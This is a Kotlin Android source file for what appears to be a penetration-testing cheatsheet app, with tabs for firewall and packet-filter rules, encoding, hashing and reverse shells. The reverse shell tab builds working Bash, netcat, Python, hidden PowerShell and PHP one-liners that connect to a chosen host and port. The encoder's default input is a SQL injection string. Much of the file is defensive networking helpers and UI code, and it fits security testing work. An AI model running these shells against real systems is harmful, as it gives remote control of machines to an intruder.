package com.hackingcheatsheets.app.ui.screens

import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.net.Uri
import android.util.Base64
import android.widget.Toast
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.PaddingValues
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Check
import androidx.compose.material.icons.filled.Clear
import androidx.compose.material.icons.filled.ContentCopy
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.IconButton
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedTextField
import androidx.compose.material3.OutlinedTextFieldDefaults
import androidx.compose.material3.Switch
import androidx.compose.material3.SwitchDefaults
import androidx.compose.material3.Tab
import androidx.compose.material3.TabRow
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.collectAsState
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableIntStateOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.hackingcheatsheets.app.data.AppLanguage
import com.hackingcheatsheets.app.ui.components.CodeBlockView
import com.hackingcheatsheets.app.ui.components.CommandBuilderView
import com.hackingcheatsheets.app.ui.theme.*
import com.hackingcheatsheets.app.viewmodel.CheatsheetViewModel

@Composable
fun UtilitiesScreen(viewModel: CheatsheetViewModel) {
    val language by viewModel.currentLanguage.collectAsState()
    val allCheatsheets by viewModel.allCheatsheets.collectAsState()
    var selectedTab by remember { mutableIntStateOf(0) }
    val tabs = if (language == AppLanguage.TR) listOf("Komut Üretici", "Ağ & Filtre", "Kodlayıcı", "Hash Araçları", "Ters Kabuk")
               else listOf("Command Builder", "Network & Filter", "Encoder", "Hash Tools", "Reverse Shell")

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(BackgroundDark)
            .padding(horizontal = 16.dp)
    ) {
        Spacer(modifier = Modifier.height(16.dp))
        Text(
            text = if (language == AppLanguage.TR) "HIZLI ARAÇLAR" else "QUICK UTILITIES",
            style = MaterialTheme.typography.headlineLarge,
            color = CyberGreen
        )
        Text(
            text = if (language == AppLanguage.TR) "Saha testleri için çevrimdışı yardımcılar" else "Offline utilities for active assessments",
            style = MaterialTheme.typography.bodyMedium,
            color = TextSecondary
        )
        Spacer(modifier = Modifier.height(16.dp))

        TabRow(
            selectedTabIndex = selectedTab,
            containerColor = SurfaceDark,
            contentColor = CyberGreen,
            modifier = Modifier.clip(RoundedCornerShape(8.dp))
        ) {
            tabs.forEachIndexed { index, title ->
                Tab(
                    selected = selectedTab == index,
                    onClick = { selectedTab = index },
                    text = { Text(text = title, fontSize = 11.sp, maxLines = 1, color = if (selectedTab == index) CyberGreen else TextMuted) }
                )
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        when (selectedTab) {
            0 -> CommandBuilderTab(language, allCheatsheets)
            1 -> NetworkFilterRuleTab(language)
            2 -> EncoderDecoderTab(language)
            3 -> HashToolsTab(language)
            4 -> ReverseShellGeneratorTab(language)
        }
    }
}

@Composable
fun CommandBuilderTab(
    language: AppLanguage,
    allCheatsheets: List<com.hackingcheatsheets.app.data.Cheatsheet>
) {
    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 90.dp)
    ) {
        item {
            CommandBuilderView(language = language, allCheatsheets = allCheatsheets)
        }
    }
}

@Composable
fun ReverseShellGeneratorTab(language: AppLanguage) {
    var ip by remember { mutableStateOf("10.10.14.5") }
    var port by remember { mutableStateOf("4444") }
    var selectedShell by remember { mutableStateOf("Bash -i") }
    val shells = listOf("Bash -i", "Bash 196", "nc mkfifo", "Python3", "PowerShell", "PHP")

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedTextField(
                    value = ip,
                    onValueChange = { ip = it },
                    label = { Text("LHOST (IP)") },
                    modifier = Modifier.weight(1.5f),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = CyberGreen,
                        unfocusedBorderColor = BorderDark,
                        focusedTextColor = TextPrimary,
                        unfocusedTextColor = TextPrimary
                    )
                )
                OutlinedTextField(
                    value = port,
                    onValueChange = { port = it },
                    label = { Text("LPORT") },
                    modifier = Modifier.weight(1f),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = CyberGreen,
                        unfocusedBorderColor = BorderDark,
                        focusedTextColor = TextPrimary,
                        unfocusedTextColor = TextPrimary
                    )
                )
            }

            Spacer(modifier = Modifier.height(12.dp))

            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .horizontalScroll(rememberScrollState()),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                shells.forEach { s ->
                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(8.dp))
                            .background(if (selectedShell == s) CyberGreen else SurfaceVariantDark)
                            .clickable { selectedShell = s }
                            .padding(horizontal = 12.dp, vertical = 8.dp)
                    ) {
                        Text(
                            text = s,
                            color = if (selectedShell == s) BackgroundDark else TextPrimary,
                            fontWeight = FontWeight.Bold,
                            fontSize = 12.sp
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(16.dp))

            val payload = when (selectedShell) {
                "Bash -i" -> "bash -i >& /dev/tcp/$ip/$port 0>&1"
                "Bash 196" -> "0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196"
                "nc mkfifo" -> "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
                "Python3" -> "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
                "PowerShell" -> "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
                "PHP" -> "php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                else -> "bash -i >& /dev/tcp/$ip/$port 0>&1"
            }

            Text(
                text = if (language == AppLanguage.TR) "ÜRETİLEN TERS KABUK (PAYLOAD)" else "GENERATED REVERSE SHELL",
                style = MaterialTheme.typography.labelLarge,
                color = CyberGreen
            )
            Spacer(modifier = Modifier.height(4.dp))
            CodeBlockView(code = payload, language = selectedShell)
        }
    }
}

@Composable
fun NetworkFilterRuleTab(language: AppLanguage) {
    var toolMode by remember { mutableIntStateOf(0) } // 0: tcpdump/tshark (BPF), 1: iptables, 2: UFW
    val modes = listOf("tcpdump (BPF)", "tshark", "iptables", "UFW")

    // BPF State
    var bpfPreset by remember { mutableStateOf("syn_only") }
    var iface by remember { mutableStateOf("eth0") }
    var customHost by remember { mutableStateOf("") }
    var customPort by remember { mutableStateOf("") }
    var noDns by remember { mutableStateOf(true) }
    var verbose by remember { mutableStateOf(true) }
    var hexDump by remember { mutableStateOf(false) }
    var pcapFile by remember { mutableStateOf("traffic.pcap") }
    var savePcap by remember { mutableStateOf(false) }

    // iptables State
    var iptAction by remember { mutableStateOf("DROP") }
    var iptProto by remember { mutableStateOf("tcp") }
    var iptPort by remember { mutableStateOf("22") }
    var iptSource by remember { mutableStateOf("10.10.10.0/24") }
    var iptRateLimit by remember { mutableStateOf(true) }
    var iptLog by remember { mutableStateOf(false) }

    // UFW State
    var ufwAction by remember { mutableStateOf("deny") }
    var ufwPort by remember { mutableStateOf("22/tcp") }
    var ufwSource by remember { mutableStateOf("192.168.1.100") }

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            // Mode selector
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .horizontalScroll(rememberScrollState()),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                modes.forEachIndexed { idx, name ->
                    val selected = toolMode == idx
                    Box(
                        modifier = Modifier
                            .clip(RoundedCornerShape(8.dp))
                            .background(if (selected) CyberGreen.copy(alpha = 0.2f) else SurfaceDark)
                            .border(1.dp, if (selected) CyberGreen else BorderDark, RoundedCornerShape(8.dp))
                            .clickable { toolMode = idx }
                            .padding(horizontal = 12.dp, vertical = 7.dp)
                    ) {
                        Text(
                            text = name,
                            color = if (selected) CyberGreen else TextSecondary,
                            fontWeight = if (selected) FontWeight.Bold else FontWeight.Normal,
                            fontSize = 12.sp,
                            fontFamily = FontFamily.Monospace
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(14.dp))

            when (toolMode) {
                0, 1 -> { // BPF (tcpdump & tshark)
                    Text(
                        text = if (language == AppLanguage.TR) "HAZIR BPF FİLTRE ŞABLONU" else "BPF FILTER PRESET",
                        style = MaterialTheme.typography.labelMedium,
                        color = TerminalCyan
                    )
                    Spacer(modifier = Modifier.height(6.dp))

                    val presets = listOf(
                        "syn_only" to (if (language == AppLanguage.TR) "SYN Taraması (Port Scan)" else "SYN Only (Port Scan)"),
                        "http" to (if (language == AppLanguage.TR) "HTTP İstekleri (GET/POST)" else "HTTP Requests"),
                        "dns" to (if (language == AppLanguage.TR) "DNS Sorguları (Port 53)" else "DNS Queries (Port 53)"),
                        "icmp" to (if (language == AppLanguage.TR) "ICMP Ping (Echo Req/Rep)" else "ICMP Ping"),
                        "arp" to (if (language == AppLanguage.TR) "ARP Trafiği" else "ARP Traffic"),
                        "custom" to (if (language == AppLanguage.TR) "Özel Filtre" else "Custom Filter")
                    )

                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .horizontalScroll(rememberScrollState()),
                        horizontalArrangement = Arrangement.spacedBy(6.dp)
                    ) {
                        presets.forEach { (key, lbl) ->
                            val sel = bpfPreset == key
                            Box(
                                modifier = Modifier
                                    .clip(RoundedCornerShape(6.dp))
                                    .background(if (sel) TerminalCyan.copy(alpha = 0.2f) else SurfaceVariantDark)
                                    .border(1.dp, if (sel) TerminalCyan else BorderDark, RoundedCornerShape(6.dp))
                                    .clickable { bpfPreset = key }
                                    .padding(horizontal = 10.dp, vertical = 6.dp)
                            ) {
                                Text(
                                    text = lbl,
                                    fontSize = 11.sp,
                                    color = if (sel) TerminalCyan else TextSecondary,
                                    fontWeight = if (sel) FontWeight.Bold else FontWeight.Normal
                                )
                            }
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))

                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        OutlinedTextField(
                            value = iface,
                            onValueChange = { iface = it },
                            label = { Text("Arayüz (-i)") },
                            modifier = Modifier.weight(1f),
                            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                            singleLine = true
                        )
                        OutlinedTextField(
                            value = customPort,
                            onValueChange = { customPort = it },
                            label = { Text("Port (opsiyonel)") },
                            modifier = Modifier.weight(1f),
                            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                            singleLine = true
                        )
                    }

                    Spacer(modifier = Modifier.height(8.dp))

                    OutlinedTextField(
                        value = customHost,
                        onValueChange = { customHost = it },
                        label = { Text("Hedef Host/IP veya Ağ (opsiyonel)") },
                        modifier = Modifier.fillMaxWidth(),
                        colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                        singleLine = true
                    )

                    Spacer(modifier = Modifier.height(8.dp))

                    // BPF toggles
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text("-nn (DNS ve Port İsimlerini Çözme)", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = noDns, onCheckedChange = { noDns = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text("-v (Ayrıntılı Paket Başlıkları)", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = verbose, onCheckedChange = { verbose = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text("-X (Hex ve ASCII Paket Dökümü)", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = hexDump, onCheckedChange = { hexDump = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text("-w $pcapFile (Trafiği Dosyaya Kaydet)", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = savePcap, onCheckedChange = { savePcap = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }

                    val filterCore = when (bpfPreset) {
                        "syn_only" -> "tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0"
                        "http" -> "tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)"
                        "dns" -> "udp port 53 or tcp port 53"
                        "icmp" -> "icmp[icmptype] == icmp-echo or icmp[icmptype] == icmp-echoreply"
                        "arp" -> "arp"
                        else -> {
                            val fList = mutableListOf<String>()
                            if (customHost.isNotBlank()) fList.add("host ${customHost.trim()}")
                            if (customPort.isNotBlank()) fList.add("port ${customPort.trim()}")
                            if (fList.isEmpty()) "ip" else fList.joinToString(" and ")
                        }
                    }

                    val finalFilter = if (bpfPreset != "custom" && customHost.isNotBlank()) "($filterCore) and host ${customHost.trim()}" else filterCore

                    val tcpdumpCmd = buildString {
                        append("sudo tcpdump -i $iface")
                        if (noDns) append(" -nn")
                        if (verbose) append(" -v")
                        if (hexDump) append(" -X")
                        append(" -s 0")
                        if (savePcap) append(" -w $pcapFile")
                        append(" '$finalFilter'")
                    }

                    val tsharkCmd = buildString {
                        append("tshark -i $iface")
                        if (noDns) append(" -n")
                        append(" -f \"$finalFilter\"")
                        if (savePcap) append(" -w $pcapFile")
                    }

                    Spacer(modifier = Modifier.height(14.dp))
                    Text(
                        text = if (toolMode == 0) "ÜRETİLEN TCPDUMP KOMUTU" else "ÜRETİLEN TSHARK KOMUTU",
                        style = MaterialTheme.typography.labelLarge,
                        color = CyberGreen
                    )
                    Spacer(modifier = Modifier.height(4.dp))
                    CodeBlockView(code = if (toolMode == 0) tcpdumpCmd else tsharkCmd, language = "bash")
                }
                2 -> { // iptables
                    Text(
                        text = if (language == AppLanguage.TR) "EYLEM (ACTION)" else "ACTION",
                        style = MaterialTheme.typography.labelMedium,
                        color = WarningOrange
                    )
                    Spacer(modifier = Modifier.height(6.dp))
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        listOf("DROP", "ACCEPT", "REJECT").forEach { act ->
                            val sel = iptAction == act
                            Box(
                                modifier = Modifier
                                    .weight(1f)
                                    .clip(RoundedCornerShape(6.dp))
                                    .background(if (sel) ExploitRed.copy(alpha = 0.2f) else SurfaceVariantDark)
                                    .border(1.dp, if (sel) ExploitRed else BorderDark, RoundedCornerShape(6.dp))
                                    .clickable { iptAction = act }
                                    .padding(vertical = 7.dp),
                                contentAlignment = Alignment.Center
                            ) { Text(text = act, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = if (sel) ExploitRed else TextSecondary) }
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        OutlinedTextField(
                            value = iptProto,
                            onValueChange = { iptProto = it },
                            label = { Text("Protokol (-p: tcp, udp)") },
                            modifier = Modifier.weight(1f),
                            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                            singleLine = true
                        )
                        OutlinedTextField(
                            value = iptPort,
                            onValueChange = { iptPort = it },
                            label = { Text("Port (--dport: 22)") },
                            modifier = Modifier.weight(1f),
                            colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                            singleLine = true
                        )
                    }

                    Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(
                        value = iptSource,
                        onValueChange = { iptSource = it },
                        label = { Text("Kaynak IP / CIDR (-s: 10.10.10.0/24)") },
                        modifier = Modifier.fillMaxWidth(),
                        colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                        singleLine = true
                    )

                    Spacer(modifier = Modifier.height(8.dp))
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text(if (language == AppLanguage.TR) "Brute-force Sınırlandırma (Limit 3/min)" else "Rate Limit (3/min)", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = iptRateLimit, onCheckedChange = { iptRateLimit = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }
                    Row(modifier = Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
                        Text(if (language == AppLanguage.TR) "Engellenen Paketleri Logla (-j LOG)" else "Log Dropped Packets", fontSize = 11.5.sp, color = TextPrimary)
                        Switch(checked = iptLog, onCheckedChange = { iptLog = it }, colors = SwitchDefaults.colors(checkedThumbColor = BackgroundDark, checkedTrackColor = CyberGreen))
                    }

                    val iptCmd = buildString {
                        if (iptLog) {
                            append("sudo iptables -A INPUT -p $iptProto")
                            if (iptPort.isNotBlank()) append(" --dport $iptPort")
                            if (iptSource.isNotBlank()) append(" -s $iptSource")
                            append(" -j LOG --log-prefix \"FIREWALL_BLOCKED: \"\n")
                        }
                        append("sudo iptables -A INPUT -p $iptProto")
                        if (iptPort.isNotBlank()) append(" --dport $iptPort")
                        if (iptSource.isNotBlank()) append(" -s $iptSource")
                        if (iptRateLimit) append(" -m limit --limit 3/min --limit-burst 3")
                        append(" -j $iptAction")
                    }

                    Spacer(modifier = Modifier.height(14.dp))
                    Text(
                        text = if (language == AppLanguage.TR) "ÜRETİLEN IPTABLES KURALI" else "GENERATED IPTABLES RULE",
                        style = MaterialTheme.typography.labelLarge,
                        color = CyberGreen
                    )
                    Spacer(modifier = Modifier.height(4.dp))
                    CodeBlockView(code = iptCmd, language = "bash")
                }
                3 -> { // UFW
                    Text(
                        text = if (language == AppLanguage.TR) "EYLEM (ACTION)" else "ACTION",
                        style = MaterialTheme.typography.labelMedium,
                        color = WarningOrange
                    )
                    Spacer(modifier = Modifier.height(6.dp))
                    Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        listOf("deny", "allow", "limit").forEach { act ->
                            val sel = ufwAction == act
                            Box(
                                modifier = Modifier
                                    .weight(1f)
                                    .clip(RoundedCornerShape(6.dp))
                                    .background(if (sel) CyberGreen.copy(alpha = 0.2f) else SurfaceVariantDark)
                                    .border(1.dp, if (sel) CyberGreen else BorderDark, RoundedCornerShape(6.dp))
                                    .clickable { ufwAction = act }
                                    .padding(vertical = 7.dp),
                                contentAlignment = Alignment.Center
                            ) { Text(text = act, fontSize = 11.sp, fontWeight = FontWeight.Bold, color = if (sel) CyberGreen else TextSecondary) }
                        }
                    }

                    Spacer(modifier = Modifier.height(10.dp))
                    OutlinedTextField(
                        value = ufwPort,
                        onValueChange = { ufwPort = it },
                        label = { Text("Port / Servis (örn: 22/tcp, 80,443/tcp, OpenSSH)") },
                        modifier = Modifier.fillMaxWidth(),
                        colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                        singleLine = true
                    )
                    Spacer(modifier = Modifier.height(8.dp))
                    OutlinedTextField(
                        value = ufwSource,
                        onValueChange = { ufwSource = it },
                        label = { Text("Kaynak IP / Subnet (opsiyonel: 192.168.1.100)") },
                        modifier = Modifier.fillMaxWidth(),
                        colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = CyberGreen, unfocusedBorderColor = BorderDark, focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary),
                        singleLine = true
                    )

                    val ufwCmd = if (ufwSource.isNotBlank()) {
                        "sudo ufw $ufwAction from $ufwSource to any port $ufwPort"
                    } else {
                        "sudo ufw $ufwAction $ufwPort"
                    }

                    Spacer(modifier = Modifier.height(14.dp))
                    Text(
                        text = if (language == AppLanguage.TR) "ÜRETİLEN UFW KURALI" else "GENERATED UFW RULE",
                        style = MaterialTheme.typography.labelLarge,
                        color = CyberGreen
                    )
                    Spacer(modifier = Modifier.height(4.dp))
                    CodeBlockView(code = ufwCmd, language = "bash")
                }
            }
        }
    }
}

@Composable
fun EncoderDecoderTab(language: AppLanguage) {
    var input by remember { mutableStateOf("admin' OR 1=1-- -") }
    var output by remember { mutableStateOf("") }
    var hexWithSpaces by remember { mutableStateOf(false) }

    LazyColumn(
        modifier = Modifier.fillMaxSize(),
        contentPadding = PaddingValues(bottom = 80.dp)
    ) {
        item {
            OutlinedTextField(
                value = input,
                onValueChange = { input = it },
                label = { Text(if (language == AppLanguage.TR) "Girdi Metni / Değer" else "Input Text / Value") },
                modifier = Modifier.fillMaxWidth(),
                colors = OutlinedTextFieldDefaults.colors(
                    focusedBorderColor = CyberGreen,
                    unfocusedBorderColor = BorderDark,
                    focusedTextColor = TextPrimary,
                    unfocusedTextColor = TextPrimary
                )
            )

            Spacer(modifier = Modifier.height(12.dp))

            Text(
                text = if (language == AppLanguage.TR) "DÖNÜŞTÜRÜCÜ AKSİYONLARI" else "TRANSFORMATION ACTIONS",
                style = MaterialTheme.typography.labelSmall,
                color = TerminalCyan
            )
            Spacer(modifier = Modifier.height(6.dp))

            // 1. Base64
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                Button(
                    onClick = { output = Base64.encodeToString(input.toByteArray(Charsets.UTF_8), Base64.NO_WRAP) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("Base64 Enc", fontSize = 10.5.sp, color = CyberGreen) }

                Button(
                    onClick = {
                        output = try { String(Base64.decode(input.trim(), Base64.DEFAULT), Charsets.UTF_8) }
                        catch (e: Exception) { "Invalid Base64 format" }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("Base64 Dec", fontSize = 10.5.sp, color = TerminalCyan) }

                Button(
                    onClick = { output = Base64.encodeToString(input.toByteArray(Charsets.UTF_8), Base64.URL_SAFE or Base64.NO_WRAP) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("B64 URL-Safe", fontSize = 10.sp, color = CyberGreen) }
            }

            Spacer(modifier = Modifier.height(6.dp))

            // 2. URL & Hex
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                Button(
                    onClick = { output = Uri.encode(input) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("URL Enc", fontSize = 10.5.sp, color = CyberGreen) }

                Button(
                    onClick = {
                        output = try { Uri.decode(input) } catch (e: Exception) { "Invalid URL encoding" }
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("URL Dec", fontSize = 10.5.sp, color = TerminalCyan) }

                Button(
                    onClick = {
                        // Full URL encode every char
                        output = input.map { "%" + String.format("%02X", it.code) }.joinToString("")
                    },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("Full URL", fontSize = 10.sp, color = CyberGreen) }
            }

            Spacer(modifier = Modifier.height(6.dp))

            // 3. Hex / ASCII
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                Button(
                    onClick = { output = stringToHex(input, hexWithSpaces) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("Text -> Hex", fontSize = 10.5.sp, color = CyberGreen) }

                Button(
                    onClick = { output = hexToString(input) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("Hex -> Text", fontSize = 10.5.sp, color = TerminalCyan) }
            }

            Spacer(modifier = Modifier.height(6.dp))

            // 4. HTML & ROT13 & IP Converter
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(6.dp)) {
                Button(
                    onClick = { output = htmlEntityEncode(input) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("HTML Enc", fontSize = 10.sp, color = CyberGreen) }

                Button(
                    onClick = { output = htmlEntityDecode(input) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("HTML Dec", fontSize = 10.sp, color = TerminalCyan) }

                Button(
                    onClick = { output = rot13(input) },
                    colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                    modifier = Modifier.weight(1f)
                ) { Text("ROT13", fontSize = 10.sp, color = WarningOrange) }
            }

            Spacer(modifier = Modifier.height(6.dp))

            Button(
                onClick = {
                    val converted = convertIpv4(input)
                    output = if (converted.isNotEmpty()) {
                        converted.entries.joinToString("\n") { "${it.key}: ${it.value}" }
                    } else {
                        "Geçerli bir IPv4 adresi girin (örn: 127.0.0.1 veya 192.168.1.1)"
                    }
                },
                colors = ButtonDefaults.buttonColors(containerColor = SurfaceVariantDark),
                modifier = Modifier.fillMaxWidth()
            ) {
                Text("IPv4 Dönüştür (Decimal, Hex, Octal, Binary)", fontSize = 11.sp, color = CyberGreen)
            }

            Spacer(modifier = Modifier.height(14.dp))

            Text(
                text = if (language == AppLanguage.TR) "SONUÇ" else "OUTPUT",
                style = MaterialTheme.typography.labelLarge,
                color = CyberGreen
            )
            Spacer(modifier = Modifier.height(4.dp))
            CodeBlockView(code = output.ifEmpty { "(No output yet)" }, language = "text")
        }
    }
}

@Composable
fun HashToolsTab(language: AppLanguage) {
    var toolMode by remember { mutableIntStateOf(0) } // 0: Tanıma, 1: Hashleme

    Column(modifier = Modifier.fillMaxSize()) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(bottom = 12.dp)
                .clip(RoundedCornerShape(8.dp))
                .background(SurfaceDark)
                .border(1.dp, BorderDark, RoundedCornerShape(8.dp))
                .padding(3.dp)
        ) {
            Box(
                modifier = Modifier
                    .weight(1f)
                    .clip(RoundedCornerShape(6.dp))
                    .background(if (toolMode == 0) CyberGreen.copy(alpha = 0.2f) else androidx.compose.ui.graphics.Color.Transparent)
                    .clickable { toolMode = 0 }
                    .padding(vertical = 8.dp),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    text = if (language == AppLanguage.TR) "🔍 Hash Tanıma (Analiz)" else "🔍 Hash Identifier",
                    fontSize = 11.5.sp,
                    fontWeight = if (toolMode == 0) FontWeight.Bold else FontWeight.Medium,
